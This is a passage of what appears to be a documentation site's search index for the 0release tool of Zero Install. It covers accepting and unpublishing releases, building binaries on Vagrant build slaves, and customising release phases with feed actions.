and resume this script when done)\nPublish/Fail:\n</code></pre> <p>0release has now created a candidate archive for you to examine. You might like to try running the program now. Note that the archive only contains files that are under version control.</p> <p>You can either leave 0release running while you check it, or you can press CTRL-C to exit and run the make-release script again later. It will remember where it was (it stores the current status in a new <code>release-status</code> file).</p> <p>As well as exporting the release archive, 0release also updates your Git repository by committing two new revisions. You can see them using <code>gitk --all</code>:</p> <p></p> <p>The lowest two revisions are the history you started with. The <code>master</code> branch adds the commit where you changed the <code>&lt;feed-for&gt;</code> element. This is also the currently checked-out version. 0release has created a new branch called <code>0release-tmp</code> with two new revisions. <code>Release 0.1</code> is the version that will be released. Its local feed has the version <code>0.1</code> and today's date as the release date. The archive was created from this revision. The next revision has a version of <code>0.1-post</code> and removes the release date again. Note that the release hasn't been tagged yet in Git, but 0release has recorded the revision ID in case you decide to accept the release candidate.</p> <p>If you discover any problems you can go ahead and commit a fix, which will appear on the master branch (not on the <code>0release-tmp</code> branch, which will be discarded if you fail the release).</p>"},{"location":"tools/0release/#accepting-the-release-candidate","title":"Accepting the release candidate","text":"<p>We'll just check that the release works:</p> <pre><code>$ 0install run 0.1/helloworld-0.1/HelloWorld.xml\nHello World!\n</code></pre> <p>Looks good. If you killed the release script (with CTRL-C), run it again now to return to the Publish/Fail prompt. Choose <code>Publish</code> (you can just type <code>p&lt;Return&gt;</code>).</p> <p>Note</p> <p>0release will sign the release tag using your GPG key. If you don't have one, use <code>gpg --gen-key</code> to create one now. If you have multiple keys, pass <code>-k ID</code> to 0release to choose which one you want to use.</p> <p>The temporary files (<code>release-status</code> and the extracted <code>helloworld-0.1</code> directory) are removed, and it creates a <code>merged.xml</code> feed. In our case, that's just the same as the one we tested, but if we were releasing a program that needed compiling, it would gather together the source and all the binaries into one feed here.</p> <p>Finally, it hands this off to 0repo:</p> <pre><code>Tagged as v0.1\nHEAD is now at 07f3c9e Start development series 0.1-post\nDeleted branch 0release-tmp (was f9fb36a).\nHanding off to 0repo:\n0repo add -- merged.xml\n[...]\n</code></pre> <p>If you check your Git repository, you'll see that 0release has now tagged the release, and updated the \"master\" branch to the tip of the temporary branch:</p> <p></p> <p>If, instead, you had found a problem with the release you would have selected <code>Fail</code> at the prompt. 0release would have removed the temporary branch (leaving <code>master</code> where it was) and deleted the temporary files.</p>"},{"location":"tools/0release/#customising-the-release-process","title":"Customising the release process","text":"<p>For more information, see release phases.</p>"},{"location":"tools/0release/#source-and-binaries","title":"Source and binaries","text":"<p>If your program needs to be compiled, see Releasing binaries.</p>"},{"location":"tools/0release/#aborting-a-release","title":"Aborting a release","text":"<p>You can abort a release easily at any point before the Publish step. Once you select <code>Publish</code>, externally-visible changes start to be made (e.g. archives are uploaded to your file-server).</p> To abort before publishing Just select <code>Fail</code> from the menu. This deletes the <code>release-status</code> file (which you could also do manually). To avoid confusion, selecting <code>Fail</code> also removes the temporary release branch from Git and renames the release directory (to <code>$version~</code>) to make it clear that they're not being used. To abort after publishing has started Follow the steps in Unpublishing a release below to undo any publicly visible changes. Then delete the <code>release-status</code> file."},{"location":"tools/0release/#unpublishing-a-release","title":"Unpublishing a release","text":"<p>So, you didn't test the release properly, and now you want to pull it down, eh?</p> <p>The best way to do this is to set the stability to BUGGY in the public feed (and re-run 0repo to regenerate the signature), and then publish a new fixed release, with a new version number.</p> <p>But if you really insist on trying to unpublish a release and pretending it never happened, here's what you have to do:</p> <ol> <li> <p>Edit the master feed (in 0repo's <code>feeds</code> directory) and delete the new <code>&lt;implementation&gt;</code>. Run <code>0repo</code> to sign and publish the updated feed.</p> <p>Note: if you keep your feed under version control then you could revert the change. However, if anyone got the new version before you reverted it, then <code>0install</code> will refuse to go back to the previous version, assuming that this is a replay attack. So create a new signature, with a fresh time-stamp.</p> </li> <li> <p>Reset <code>HEAD</code> to before the release (e.g. <code>git reset --hard v0.1^</code>) and delete the tag itself (e.g. <code>git tag -d v0.1</code>). Delete the remote tag at the server (e.g. <code>git push origin :v0.1 master</code>). Like <code>0install</code>, if anyone saw the release in Git, their Git will refuse to go back to an older version. Tell them to use <code>-f</code>.</p> </li> <li> <p>Delete the tarball from your server.</p> </li> </ol>"},{"location":"tools/0release/#do-i-need-to-keep-the-releases-directory","title":"Do I need to keep the releases directory?","text":"<p>It's best to keep the releases directory:</p> <ul> <li>You want to keep the make-release script so you don't have to write it again each time.</li> <li>Keeping the previous archive allows diffing against it as an extra check when making a new release.</li> </ul> <p>So, there's nothing too critical in the directory, but it's easiest to keep everything.</p> <pre><code>!!! todo\n    0release should also be able to diff against the previous version using the cache (downloading the archive if missing), rather than relying on the previous archive being in the releases directory.\n</code></pre>"},{"location":"tools/0release/compiled-binaries/","title":"0release: Compiled binaries","text":""},{"location":"tools/0release/compiled-binaries/#releases-with-source-and-binary-packages","title":"Releases with source and binary packages","text":"<p>0release can be used to create releases of your software from a version control system. The main page described how to make releases of programs which are architecture-independent (e.g. programs written in Python) where a single package is produced. This page explains what happens for programs which must be compiled for different architectures (e.g. C programs).</p> <p>The extended release process looks like this:</p> <p></p> <pre><code>!!! todo\n0release doesn't currently unit-test the binaries it produces\n</code></pre> <p>After generating an archive and a feed for the source code release candidate (where <code>arch='*-src'</code>), 0release also compiles a binary for the host system (using 0compile). It uploads both the source and binary archive and publishes both in the Zero Install feed.</p> <p>For an example of a simple binary package that works this way, have a look at the c-prog.tgz package in 0release's tests directory:</p> <pre><code>$ tar xzf c-prog.tgz\n$ mkdir release-c-prog\n$ cd release-c-prog\n$ 0install run https://apps.0install.net/0install/0release.xml ../c-prog/c-prog.xml\n</code></pre>"},{"location":"tools/0release/compiled-binaries/#compiling-on-multiple-systems","title":"Compiling on multiple systems","text":"<p>To build binaries for multiple architectures, you'll need to create a configuration file listing the available builders. 0release uses the Base Directory Specification to find its configuration files; with the default settings, you need to create the file <code>~/.config/0install.net/0release/builders.conf</code>.</p> <p>The <code>builders.conf</code> file has a <code>[global]</code> section listing the builders to use, followed by one section for each builder. Each builder can have three commands specified: one to start the builder (optional), one the actually do the build, and one to shutdown the builder (optional). Here is an example configuration:</p> <pre><code>[global]\nbuilders = host, precise32\n\n[builder-host]\nbuild = 0install run https://apps.0install.net/0install/0release.xml --build-slave \"$@\"\n\n[builder-precise32]\nbuild = build-on-vm precise32-build-slave\n</code></pre> <p>This defines two builders named <code>host</code> and <code>precise32</code>. <code>host</code> simply runs 0release in build-slave mode on the local machine (in fact, you don't need to specify this section because it exists by default). The <code>precise32</code> builder run a script (see below) to bring up a VirtualBox virtual machine, submit the build to it, and then shut it down again.</p>"},{"location":"tools/0release/compiled-binaries/#the-build-command","title":"The build command","text":"<p>The build command is called with four arguments:</p> <ol> <li>The name of the generated XML feed file for the source release candidate.</li> <li>The name of the generated source archive.</li> <li>The URL of the directory where the release will be hosted eventually.</li> <li>The name of the binary feed to be generated.</li> </ol> <p>The three names are of files in the current directory without the directory part; this simplifies the copying. The build command must do three things:</p> <ol> <li>Copy the input files (the source feed and archive) to the build system.</li> <li>Invoke <code>0release --build-slave</code> to do the build.</li> <li>Copy the results (the binary feed and archive) back to the local system.</li> </ol>"},{"location":"tools/0release/compiled-binaries/#setting-up-a-vagrant-build-slave","title":"Setting up a Vagrant build slave","text":"<p>First, we'll need to create a \"box\" with the build system. Create a Vagrantfile for the new box, e.g.</p> <pre><code>Vagrant::Config.run do |config|\n  config.vm.box = \"precise32\"\n  config.vm.box_url = \"http://files.vagrantup.com/precise32.box\"\nend\n</code></pre> <p>The bring the machine up and install the basic build environment. The only package required by 0release is 0install itself, but you must also install any system packages that are needed by the software to be built (i.e. those which can't be installed by 0install automatically):</p> <pre><code>$ vagrant up\n$ vagrant ssh -c 'sudo apt-get update &amp;&amp; \n    sudo apt-get install -y zeroinstall-injector build-essential &amp;&amp;\n    mkdir -p ~vagrant/.cache/0install.net'\n</code></pre> <p>Now package the VM into a new box and add it. You might wish to create a <code>Vagrantfile.pkg</code> to enable a shared 0install cache (see Virtual Machines / Vagrant).</p> <pre><code>$ vagrant package --vagrantfile Vagrantfile.pkg\n$ vagrant box add precise32-build-slave package.box\n</code></pre> <p>Create the <code>build-on-vm</code> script, make it executable, and place it in your <code>$PATH</code> (on the host):</p> <pre><code>#!/bin/bash\nset -eux\n\nif `[ -f Vagrantfile \\]; then\n  vagrant destroy -f &amp;&amp; rm Vagrantfile\nfi\n\nvagrant init \"$1\"\nshift\nvagrant up\nvagrant ssh-config &gt; .ssh-config\nssh -F .ssh-config default \\\n  'cd /vagrant &amp;&amp; 0install run --not-before 0.10 \\\n     https://apps.0install.net/0install/0release.xml \\\n     --build-slave \"$@\"' \"$@\" &amp;&amp; \\\n  vagrant destroy -f &amp;&amp; rm Vagrantfile\n</code></pre> <p>You can then use it in your <code>builders.conf</code>, as above.</p>"},{"location":"tools/0release/customisation/","title":"0release: Customisation","text":"<p>0release can be used to create releases of your software from a version control system. It uses sensible defaults, allowing it to create releases for simple projects with very little configuration. For more complex projects, you can specify extra commands that should be run during the release process using the syntax described here.</p>"},{"location":"tools/0release/customisation/#example","title":"Example","text":"<p>For example, imagine that our hello-world example program now prints out a banner with its version number when run. <code>hello.py</code> now looks like this:</p> <pre><code>#!/usr/bin/env python\nversion='0.1'\nprint \"Welcome to Hello World version %s\" % version\nprint \"Hello World!\"\n</code></pre> <p>We want to make sure that the number in the hello.py file is updated automatically when we make a new release. To do this, add a  element to your feed, like this: <pre><code>&lt;interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;\n  &lt;name&gt;HelloWorld&lt;/name&gt;\n  &lt;summary&gt;minimal demonstration package for 0release&lt;/summary&gt;\n  &lt;description&gt;\n    This program outputs the message \"Hello World\". You can create new releases of it\n    using 0release.\n  &lt;/description&gt;\n\n  &lt;release:management xmlns:release='http://zero-install.sourceforge.net/2007/namespaces/0release'&gt;\n    &lt;release:action phase='commit-release'&gt;sed -i \"s/^version='.*'$/version='$RELEASE_VERSION'/\" hello.py&lt;/release:action&gt;\n  &lt;/release:management&gt;\n  ...\n&lt;/interface&gt;\n</code></pre> <p>This tells 0release that during the <code>commit-release</code> phase (in which it updates the version number to the number chosen for the release) it should execute the given command, which updates the version line in the Python code. Of course, you can perform any action you want.</p>"},{"location":"tools/0release/customisation/#phase-commit-release","title":"Phase: commit-release","text":"Current directory The working copy (under version control), as specified by the <code>id</code> attribute in the feed. <code>$RELEASE_VERSION</code> The version chosen for the new release. <p>These actions are run after the user has entered the version number for the new release. After the actions are run, 0release will update the local feed file with the new version number and commit all changes to the version control system.</p> <p>Any changes made to the working copy will therefore appear in both the history and also in the release archive.</p> <p>If your script fails (returns a non-zero exit status), 0release will abort but will not revert any changes made by the actions. You will have to manually revert any changes before 0release will allow you to restart the release process.</p>"},{"location":"tools/0release/customisation/#phase-generate-archive","title":"Phase: generate-archive","text":"Current directory A temporary directory created by unpacking the archive exported from the SCM. <code>$RELEASE_VERSION</code> The version chosen for the new release. <p>Once the release version is committed to version control, 0release exports that revision to a temporary directory. After running all the actions in this phase, the release tarball is created from the final state of the directory. Use this phase to generate files that should be in the release archive but not in the tagged revision under version control. Typical actions here are:</p> <ul> <li>Running <code>autoconf</code> to create a <code>configure</code> script.</li> <li>Building translations (<code>.mo</code> files) from source <code>.po</code> files.</li> <li>Building documentation (e.g. HTML from DocBook sources).</li> </ul> <p>Notice that all the above generate platform independent files. Do not compile to platform-specific binaries here (e.g. do not compile C source files to executables). For such programs, you need one source package and multiple binary packages (one for each architecture). See Releases with source and binary packages for that.</p>"},{"location":"tools/0release/customisation/#add-toplevel-directory","title":"&lt;add-toplevel-directory&gt;","text":"<p>Adding this element causes 0release to put everything in a sub-directory, named after the feed. This is probably only useful for ROX applications, where the version control system contains e.g. just <code>AppRun</code>but the release should contain <code>archive-2.2/Archive/AppRun</code>. This is done using:</p> <pre><code>  &lt;release:management xmlns:release=\"http://zero-install.sourceforge.net/2007/namespaces/0release\"&gt;\n    &lt;release:add-toplevel-directory/&gt;\n  &lt;/release:management&gt;\n</code></pre>"}]}